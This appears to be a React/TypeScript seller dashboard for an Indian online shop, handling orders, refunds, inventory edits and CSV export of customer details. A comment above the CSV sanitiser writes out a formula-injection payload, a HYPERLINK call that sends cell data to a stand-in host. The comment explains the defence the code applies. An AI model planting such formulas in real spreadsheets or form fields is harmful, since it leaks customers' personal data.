"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { moneyINR, isRefundable } from "@/lib/commerce";
import { useToast } from "@/components/Toast";

/* Seller dashboard — order queue + inventory. All mutations go through
   /api/admin/* routes, which re-verify the admin session on every call. */

interface AdminOrderItem {
  product_id: string;
  title: string;
  qty: number;
  unit_price_paise: number;
}

interface AdminOrder {
  id: string;
  order_no: number;
  email: string;
  phone: string | null;
  status: string;
  amount_paise: number;
  shipping_paise: number;
  razorpay_order_id: string | null;
  razorpay_payment_id: string | null;
  awb: string | null;
  tracking_url: string | null;
  gift: boolean;
  gift_note: string | null;
  ship_name: string | null;
  ship_address: string | null;
  ship_city: string | null;
  ship_state: string | null;
  ship_pincode: string | null;
  created_at: string;
  paid_at: string | null;
  order_items: AdminOrderItem[];
}

interface AdminProduct {
  id: string;
  type: string;
  title: string;
  price_paise: number;
  tag: string | null;
  format: "physical" | "digital";
  active: boolean;
  stock_qty: number;
  track_stock: boolean;
}

const STATUSES = ["paid", "packed", "shipped", "delivered", "pending", "cancelled", "refunded"] as const;

const STATUS_LABEL: Record<string, string> = {
  pending: "Pending payment",
  paid: "Paid — pack it",
  packed: "Packed",
  shipped: "Shipped",
  delivered: "Delivered",
  cancelled: "Cancelled",
  refunded: "Refunded",
};

interface AdminSignup {
  id: string;
  kind: "course";
  name: string | null;
  email: string;
  created_at: string;
}

function fmtDate(iso: string): string {
  return new Date(iso).toLocaleString("en-IN", {
    day: "numeric", month: "short", hour: "2-digit", minute: "2-digit",
  });
}

/* Every exported value is customer-supplied — names, addresses, gift notes.
   Excel and LibreOffice treat a cell starting with = + - @ as a formula, so
   `=HYPERLINK("http://x?d="&A1)` typed into a shipping name would execute in
   the seller's spreadsheet with the whole customer list open. Prefixing an
   apostrophe forces the cell to text; the apostrophe itself is not displayed.

   The check skips leading whitespace, tab, CR and LF first: those are ignored
   when the formula parser looks for the first meaningful character, so
   "\t=cmd" is just as dangerous as "=cmd". */
function neutralize(s: string): string {
  // A plain number is inert, and quoting it would break the money columns.
  if (/^-?\d+(\.\d+)?$/.test(s)) return s;
  return /^[\s\t\r\n]*[=+\-@]/.test(s) ? `'${s}` : s;
}

function csvCell(v: string | number | null | undefined): string {
  const s = neutralize(String(v ?? ""));
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** BOM so Excel reads the diacritics in Sanskrit names correctly. */
function downloadCsv(filename: string, header: string[], rows: (string | number | null | undefined)[][]) {
  const body = [header.join(","), ...rows.map((r) => r.map(csvCell).join(","))].join("\r\n");
  const blob = new Blob(["﻿" + body], { type: "text/csv;charset=utf-8" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
  URL.revokeObjectURL(a.href);
}

export default function AdminDashboard({ adminEmail }: { adminEmail: string }) {
  const toast = useToast();
  const [tab, setTab] = useState<"orders" | "inventory" | "signups">("orders");
  const [orders, setOrders] = useState<AdminOrder[] | null>(null);
  const [products, setProducts] = useState<AdminProduct[] | null>(null);
  const [signups, setSignups] = useState<AdminSignup[] | null>(null);
  const [filter, setFilter] = useState<string>("all");
  const [expanded, setExpanded] = useState<string | null>(null);
  const [busy, setBusy] = useState<string | null>(null);
  const [shipForm, setShipForm] = useState<{ id: string; awb: string; url: string } | null>(null);

  const load = useCallback(async () => {
    const [oRes, pRes, sRes] = await Promise.all([
      fetch("/api/admin/orders"),
      fetch("/api/admin/products"),
      fetch("/api/admin/signups"),
    ]);
    if (oRes.ok) setOrders((await oRes.json()).orders);
    if (pRes.ok) setProducts((await pRes.json()).products);
    if (sRes.ok) setSignups((await sRes.json()).signups);
  }, []);

  useEffect(() => { load(); }, [load]);

  const counts = useMemo(() => {
    const c: Record<string, number> = { all: orders?.length ?? 0 };
    for (const s of STATUSES) c[s] = 0;
    for (const o of orders ?? []) c[o.status] = (c[o.status] ?? 0) + 1;
    return c;
  }, [orders]);

  const visible = useMemo(
    () => (orders ?? []).filter((o) => filter === "all" || o.status === filter),
    [orders, filter]
  );

  async function act(orderId: string, action: string, extra: Record<string, string> = {}) {
    setBusy(orderId);
    try {
      const res = await fetch("/api/admin/orders/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ orderId, action, ...extra }),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) { toast(json.error ?? "Action failed"); return; }
      toast(`Order updated: ${STATUS_LABEL[json.status] ?? json.status}`);
      setShipForm(null);
      await load();
    } finally {
      setBusy(null);
    }
  }

  async function refund(order: AdminOrder) {
    if (!window.confirm(`Refund ${moneyINR(order.amount_paise)} for BG-${order.order_no}? This cannot be undone.`)) return;
    setBusy(order.id);
    try {
      const res = await fetch("/api/admin/refund", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ orderId: order.id }),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) { toast(json.error ?? "Refund failed"); return; }
      toast(`BG-${order.order_no} refunded — customer emailed.`);
      await load();
    } finally {
      setBusy(null);
    }
  }

  function cancelOrder(order: AdminOrder) {
    const restocks = order.status === "paid" || order.status === "packed";
    const msg = restocks
      ? `Cancel BG-${order.order_no}? Its items go back into stock. (Refund the payment separately if it was paid.)`
      : `Cancel BG-${order.order_no}?`;
    if (window.confirm(msg)) act(order.id, "cancel");
  }

  function exportCsv() {
    const header = ["order_no", "date", "status", "name", "email", "phone", "address", "city", "state", "pincode",
      "items", "shipping_inr", "total_inr", "payment_id", "awb", "gift_note"];
    const lines: (string | number | null | undefined)[][] = visible.map((o) => [
      `BG-${o.order_no}`, o.created_at, o.status, o.ship_name, o.email, o.phone,
      o.ship_address, o.ship_city, o.ship_state, o.ship_pincode,
      o.order_items.map((i) => `${i.title} x${i.qty}`).join("; "),
      (o.shipping_paise / 100).toFixed(2), (o.amount_paise / 100).toFixed(2),
      o.razorpay_payment_id, o.awb, o.gift ? (o.gift_note ?? "gift") : "",
    ]);
    downloadCsv(`orders-${filter}-${new Date().toISOString().slice(0, 10)}.csv`, header, lines);
  }

  return (
    <main className="admin-wrap">
      <div className="container">
        <header className="admin-head">
          <div>
            <p className="eyebrow">Seller dashboard</p>
            <h1 className="admin-title">Orders &amp; inventory</h1>
          </div>
          <p className="admin-whoami">Signed in as {adminEmail}</p>
        </header>

        <div className="admin-tabs" role="tablist">
          <button role="tab" aria-selected={tab === "orders"} className={`chip ${tab === "orders" ? "is-active" : ""}`} onClick={() => setTab("orders")}>
            Orders ({counts.all})
          </button>
          <button role="tab" aria-selected={tab === "inventory"} className={`chip ${tab === "inventory" ? "is-active" : ""}`} onClick={() => setTab("inventory")}>
            Inventory
          </button>
          <button role="tab" aria-selected={tab === "signups"} className={`chip ${tab === "signups" ? "is-active" : ""}`} onClick={() => setTab("signups")}>
            Signups{signups?.length ? ` (${signups.length})` : ""}
          </button>
        </div>

        {tab === "orders" && (
          <>
            <div className="admin-filters">
              {["all", ...STATUSES].map((s) => (
                <button key={s} className={`chip ${filter === s ? "is-active" : ""}`} onClick={() => setFilter(s)}>
                  {s === "all" ? "All" : STATUS_LABEL[s]} {counts[s] ? `· ${counts[s]}` : ""}
                </button>
              ))}
              <button className="btn btn--ghost-light btn--sm admin-export" onClick={exportCsv} disabled={visible.length === 0}>
                Export CSV
              </button>
            </div>

            {orders === null && <p className="admin-empty">Loading orders…</p>}
            {orders !== null && visible.length === 0 && <p className="admin-empty">No orders here yet.</p>}

            {visible.map((o) => {
              const open = expanded === o.id;
              const isBusy = busy === o.id;
              return (
                <article key={o.id} className="admin-order">
                  <button
                    className="admin-order-summary"
                    aria-expanded={open}
                    onClick={() => setExpanded(open ? null : o.id)}
                  >
                    <span className="admin-order-no">BG-{o.order_no}{o.gift ? " 🎁" : ""}</span>
                    <span className="admin-order-meta">{fmtDate(o.created_at)}</span>
                    <span className="admin-order-meta">{o.ship_name ?? o.email}</span>
                    <span className="admin-order-meta">{o.ship_city ?? "—"}</span>
                    <span className="admin-order-amount">{moneyINR(o.amount_paise)}</span>
                    <span className={`admin-status admin-status--${o.status}`}>{STATUS_LABEL[o.status] ?? o.status}</span>
                  </button>

                  {open && (
                    <div className="admin-order-detail">
                      <div className="admin-detail-grid">
                        <div>
                          <h3>Items</h3>
                          <ul className="admin-items">
                            {o.order_items.map((i) => (
                              <li key={i.product_id}>
                                {i.title} × {i.qty} — {moneyINR(i.unit_price_paise * i.qty)}
                              </li>
                            ))}
                            <li className="admin-items-total">
                              Shipping {o.shipping_paise === 0 ? "free" : moneyINR(o.shipping_paise)} ·
                              Total <strong>{moneyINR(o.amount_paise)}</strong>
                            </li>
                          </ul>
                          {o.gift && <p className="admin-gift">Gift{o.gift_note ? ` — “${o.gift_note}”` : ""}</p>}
                        </div>
                        <div>
                          <h3>Ship to</h3>
                          <p className="admin-address">
                            {o.ship_name}<br />
                            {o.ship_address}<br />
                            {[o.ship_city, o.ship_state, o.ship_pincode].filter(Boolean).join(", ")}
                          </p>
                          <p className="admin-contact">
                            {o.email}{o.phone ? ` · ${o.phone}` : ""}
                          </p>
                          {o.razorpay_payment_id && <p className="admin-payid">Payment: {o.razorpay_payment_id}</p>}
                          {o.awb && (
                            <p className="admin-payid">
                              AWB: {o.awb}{o.tracking_url && <> · <a href={o.tracking_url} target="_blank" rel="noreferrer">tracking ↗</a></>}
                            </p>
                          )}
                        </div>
                      </div>

                      {shipForm?.id === o.id ? (
                        <div className="admin-shipform">
                          <div className="field">
                            <label htmlFor={`awb-${o.id}`}>AWB / tracking number *</label>
                            <input
                              id={`awb-${o.id}`} value={shipForm.awb} autoFocus
                              onChange={(e) => setShipForm({ ...shipForm, awb: e.target.value })}
                              placeholder="e.g. 78912345678"
                            />
                          </div>
                          <div className="field">
                            <label htmlFor={`url-${o.id}`}>Tracking URL (optional)</label>
                            <input
                              id={`url-${o.id}`} value={shipForm.url}
                              onChange={(e) => setShipForm({ ...shipForm, url: e.target.value })}
                              placeholder="https://shiprocket.co/tracking/…"
                            />
                          </div>
                          <div className="admin-actions">
                            <button className="btn btn--gold btn--sm" disabled={isBusy || !shipForm.awb.trim()}
                              onClick={() => act(o.id, "shipped", { awb: shipForm.awb, trackingUrl: shipForm.url })}>
                              Confirm shipped + email customer
                            </button>
                            <button className="btn btn--ghost-light btn--sm" onClick={() => setShipForm(null)}>Back</button>
                          </div>
                        </div>
                      ) : (
                        <div className="admin-actions">
                          {o.status === "paid" && (
                            <button className="btn btn--gold btn--sm" disabled={isBusy} onClick={() => act(o.id, "packed")}>
                              Mark packed
                            </button>
                          )}
                          {(o.status === "paid" || o.status === "packed") && (
                            <button className="btn btn--night btn--sm" disabled={isBusy}
                              onClick={() => setShipForm({ id: o.id, awb: o.awb ?? "", url: o.tracking_url ?? "" })}>
                              Mark shipped…
                            </button>
                          )}
                          {o.status === "shipped" && (
                            <button className="btn btn--gold btn--sm" disabled={isBusy} onClick={() => act(o.id, "delivered")}>
                              Mark delivered
                            </button>
                          )}
                          {["pending", "paid", "packed"].includes(o.status) && (
                            <button className="btn btn--ghost-light btn--sm" disabled={isBusy} onClick={() => cancelOrder(o)}>
                              Cancel order
                            </button>
                          )}
                          {isRefundable(o.status) && o.razorpay_payment_id && (
                            <button className="btn btn--ghost-light btn--sm admin-danger" disabled={isBusy} onClick={() => refund(o)}>
                              Refund {moneyINR(o.amount_paise)}
                            </button>
                          )}
                        </div>
                      )}
                    </div>
                  )}
                </article>
              );
            })}
          </>
        )}

        {tab === "inventory" && (
          <InventoryEditor products={products} onSaved={load} />
        )}

        {tab === "signups" && (
          <SignupsPanel signups={signups} onChanged={load} />
        )}
      </div>
    </main>
  );
}

/* --------------------------------------------------------------- signups tab */

function SignupsPanel({ signups, onChanged }: { signups: AdminSignup[] | null; onChanged: () => Promise<void> }) {
  const toast = useToast();
  const [busy, setBusy] = useState<string | null>(null);

  if (signups === null) return <p className="admin-empty">Loading signups…</p>;

  // One list now: the weekly-verse newsletter was removed, so the kind filter
  // that used to sit here had nothing left to filter between.
  const visible = signups;

  async function remove(s: AdminSignup) {
    if (!window.confirm(`Remove ${s.email} from the ${s.kind} list? Do this when someone asks to unsubscribe.`)) return;
    setBusy(s.id);
    try {
      const res = await fetch("/api/admin/signups", {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: s.id }),
      });
      if (!res.ok) { toast("Could not remove that — try again."); return; }
      toast(`${s.email} removed.`);
      await onChanged();
    } finally {
      setBusy(null);
    }
  }

  function exportSignups() {
    downloadCsv(
      `course-signups-${new Date().toISOString().slice(0, 10)}.csv`,
      ["name", "email", "signed_up"],
      visible.map((s) => [s.name, s.email, s.created_at])
    );
  }

  return (
    <>
      <p className="admin-hint">
        People who asked to hear about the free live course — {visible.length} so far.
        Export this list when you announce a batch: you promised them an email when dates
        are confirmed.
      </p>
      <div className="admin-filters">
        <button className="btn btn--ghost-light btn--sm admin-export" onClick={exportSignups} disabled={visible.length === 0}>
          Export CSV
        </button>
      </div>

      {visible.length === 0 ? (
        <p className="admin-empty">No signups on this list yet.</p>
      ) : (
        visible.map((s) => (
          <div className="admin-signup" key={s.id}>
            <span className={`admin-status admin-status--${s.kind === "course" ? "paid" : "packed"}`}>
              {s.kind === "course" ? "Live course" : "Newsletter"}
            </span>
            <span className="admin-signup__email">{s.email}</span>
            <span className="admin-signup__name">{s.name || "—"}</span>
            <span className="admin-signup__date">{fmtDate(s.created_at)}</span>
            <button
              className="btn btn--ghost-light btn--sm"
              type="button"
              disabled={busy === s.id}
              onClick={() => remove(s)}
            >
              Remove
            </button>
          </div>
        ))
      )}
    </>
  );
}

/* ------------------------------------------------------------- inventory tab */

function InventoryEditor({ products, onSaved }: { products: AdminProduct[] | null; onSaved: () => Promise<void> }) {
  const toast = useToast();
  const [edits, setEdits] = useState<Record<string, { price: string; stock: string; tag: string; active: boolean }>>({});
  const [saving, setSaving] = useState<string | null>(null);

  if (products === null) return <p className="admin-empty">Loading catalog…</p>;

  function rowState(p: AdminProduct) {
    return edits[p.id] ?? {
      price: String(p.price_paise / 100),
      stock: String(p.stock_qty),
      tag: p.tag ?? "",
      active: p.active,
    };
  }

  function isDirty(p: AdminProduct) {
    const e = edits[p.id];
    if (!e) return false;
    return e.price !== String(p.price_paise / 100) || e.stock !== String(p.stock_qty)
      || e.tag !== (p.tag ?? "") || e.active !== p.active;
  }

  async function save(p: AdminProduct) {
    const e = rowState(p);
    const rupees = Number(e.price);
    const stock = Number(e.stock);
    if (!Number.isFinite(rupees) || rupees < 0) { toast("Price must be a number"); return; }
    if (!Number.isInteger(stock) || stock < 0) { toast("Stock must be a whole number"); return; }
    setSaving(p.id);
    try {
      const res = await fetch("/api/admin/products", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: p.id,
          price_paise: Math.round(rupees * 100),
          stock_qty: stock,
          tag: e.tag.trim() || null,
          active: e.active,
        }),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) { toast(json.error ?? "Save failed"); return; }
      toast(`${p.type} saved.`);
      setEdits((prev) => { const n = { ...prev }; delete n[p.id]; return n; });
      await onSaved();
    } finally {
      setSaving(null);
    }
  }

  return (
    <div className="admin-inventory">
      <p className="admin-hint">
        Prices are what customers pay from the moment you save — the storefront reads these rows live.
        Unticking “active” hides an edition from the site entirely.
      </p>
      {products.map((p) => {
        const e = rowState(p);
        return (
          <div key={p.id} className={`admin-product ${p.active ? "" : "is-inactive"}`}>
            <div className="admin-product-name">
              <strong>{p.type}</strong>
              <span>
                {p.format === "digital"
                  ? "digital — not purchasable yet"
                  : p.track_stock
                    ? `${p.stock_qty} in stock`
                    : "made to order — always available"}
              </span>
            </div>
            <div className="field">
              <label htmlFor={`price-${p.id}`}>Price (₹)</label>
              <input id={`price-${p.id}`} inputMode="decimal" value={e.price}
                onChange={(ev) => setEdits({ ...edits, [p.id]: { ...e, price: ev.target.value } })} />
            </div>
            <div className="field">
              <label htmlFor={`stock-${p.id}`}>Stock</label>
              <input id={`stock-${p.id}`} inputMode="numeric" value={p.track_stock ? e.stock : "—"}
                disabled={!p.track_stock}
                title={p.track_stock ? undefined : "Made to order — stock is not tracked for this edition."}
                onChange={(ev) => setEdits({ ...edits, [p.id]: { ...e, stock: ev.target.value } })} />
            </div>
            <div className="field">
              <label htmlFor={`tag-${p.id}`}>Tag</label>
              <input id={`tag-${p.id}`} value={e.tag} placeholder="e.g. Most loved"
                onChange={(ev) => setEdits({ ...edits, [p.id]: { ...e, tag: ev.target.value } })} />
            </div>
            <label className="admin-active">
              <input type="checkbox" checked={e.active}
                onChange={(ev) => setEdits({ ...edits, [p.id]: { ...e, active: ev.target.checked } })} />
              Active
            </label>
            <button className="btn btn--gold btn--sm" disabled={saving === p.id || !isDirty(p)} onClick={() => save(p)}>
              {saving === p.id ? "Saving…" : "Save"}
            </button>
          </div>
        );
      })}
    </div>
  );
}
